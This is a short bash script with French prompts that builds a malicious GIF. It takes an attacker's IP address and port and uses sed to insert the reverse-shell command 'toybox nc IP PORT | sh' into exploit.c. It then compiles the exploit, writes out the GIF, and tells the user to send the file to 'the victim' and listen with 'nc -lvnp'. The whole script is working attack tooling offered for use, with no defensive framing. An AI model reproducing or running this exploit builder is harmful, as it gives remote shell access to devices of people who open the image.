#!/bin/bash

green="\e[32m"
reset="\e[0m"

echo -e "${green}Veuillez entrer l'adresse IP du serveur : ${reset}"
read -p "" ip_address

echo -e "${green}Veuillez entrer le port à utiliser : ${reset}"
read -p "" port

echo -e "${green}Veuillez entrer le nom du fichier GIF à générer (sans l'extension .gif) : ${reset}"
read -p "" gif_name

sed -i "s/\/exp > test.gif/\/exp > $gif_name.gif/" $0

sed -i "75s/.*/    char *command = \"toybox nc $ip_address $port | sh\";/" exploit.c

gcc -o exp egif_lib.c exploit.c

./exp > "$gif_name.gif"

echo -e "${green}Pour recevoir la connexion sur le serveur, veuillez envoyer $gif_name.gif à la victime en ayant pris soin d'ouvrir un terminal sur le serveur et d'exécuter la commande suivante :${reset}"
echo -e "${green}nc -lvnp $port${reset}"

rm -rf exp